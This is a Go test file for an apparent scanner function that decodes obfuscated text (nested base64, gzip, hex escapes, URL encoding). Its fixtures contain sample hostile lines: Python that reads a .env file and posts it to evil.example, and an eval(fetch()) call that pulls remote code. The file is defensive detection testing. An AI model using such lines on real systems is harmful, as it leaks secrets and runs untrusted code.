package v39

import (
	"bytes"
	"compress/gzip"
	"encoding/base64"
	"strings"
	"testing"
)

func TestMaterializeTextRecursiveBase64(t *testing.T) {
	payload := `secret=open(".env").read(); requests.post("https://evil.example/hook", data=secret)`
	once := base64.StdEncoding.EncodeToString([]byte(payload))
	twice := base64.StdEncoding.EncodeToString([]byte(once))
	materials := MaterializeText("payload.txt", []byte(twice), DefaultLimits())
	if len(materials) < 3 {
		t.Fatalf("expected raw plus two decoded levels, got %d", len(materials))
	}
	found := false
	for _, material := range materials {
		if strings.Contains(material.Text, "requests.post") && strings.Contains(material.Text, ".env") {
			found = true
			if material.Origin != "base64>base64" {
				t.Fatalf("unexpected origin %q", material.Origin)
			}
		}
	}
	if !found {
		t.Fatalf("recursive payload not materialized: %#v", materials)
	}
}

func TestMaterializeTextBase64Gzip(t *testing.T) {
	payload := []byte(`eval(fetch("https://evil.example/p"))`)
	var compressed bytes.Buffer
	zw := gzip.NewWriter(&compressed)
	if _, err := zw.Write(payload); err != nil {
		t.Fatal(err)
	}
	if err := zw.Close(); err != nil {
		t.Fatal(err)
	}
	encoded := base64.StdEncoding.EncodeToString(compressed.Bytes())
	materials := MaterializeText("payload.txt", []byte(encoded), DefaultLimits())
	found := false
	for _, material := range materials {
		if strings.Contains(material.Text, "evil.example") {
			found = true
			if material.Origin != "base64>gzip" {
				t.Fatalf("unexpected origin %q", material.Origin)
			}
		}
	}
	if !found {
		t.Fatal("gzip payload was not materialized")
	}
}

func TestMaterializeTextBoundedVariants(t *testing.T) {
	limits := DefaultLimits()
	limits.MaxDecodedVariantsPerFile = 2
	text := strings.Join([]string{
		base64.StdEncoding.EncodeToString([]byte("requests.post('https://a.example')")),
		base64.StdEncoding.EncodeToString([]byte("requests.post('https://b.example')")),
		base64.StdEncoding.EncodeToString([]byte("requests.post('https://c.example')")),
	}, " ")
	materials := MaterializeText("payload.txt", []byte(text), limits)
	if len(materials) > 3 {
		t.Fatalf("variant limit exceeded: %d", len(materials))
	}
}

func TestDecodeEscapedUnicodeAndHex(t *testing.T) {
	materials := MaterializeText("payload.js", []byte(`\x65\x76\x61\x6c("https%3A%2F%2Fevil.example")`), DefaultLimits())
	var sawEval, sawURL bool
	for _, material := range materials {
		sawEval = sawEval || strings.Contains(material.Text, "eval")
		sawURL = sawURL || strings.Contains(material.Text, "https://evil.example")
	}
	if !sawEval || !sawURL {
		t.Fatalf("escaped/url materialization incomplete: %#v", materials)
	}
}
